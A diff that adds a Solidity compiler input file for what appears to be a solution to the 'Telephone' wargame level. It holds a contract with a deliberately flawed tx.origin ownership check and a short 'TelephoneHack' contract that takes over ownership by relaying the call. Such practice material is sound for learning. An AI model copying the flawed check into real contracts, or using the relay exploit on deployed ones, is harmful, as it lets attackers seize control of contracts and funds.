@@ -1,0 +1,38 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/telephone/telephone.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ncontract Telephone {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function changeOwner(address _owner) public {\n        if (tx.origin != msg.sender) {\n            owner = _owner;\n        }\n    }\n}\n"
+    },
+    "contracts/telephone/telephoneHack.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ninterface TelephoneInterface {\n    function changeOwner(address _owner) external;\n}\n\ncontract TelephoneHack {\n    address telephoneContractAddress;\n\n    constructor(address _address) {\n        telephoneContractAddress = _address;\n    }\n\n    function hackTelephone() public {\n        TelephoneInterface(telephoneContractAddress).changeOwner(msg.sender);\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
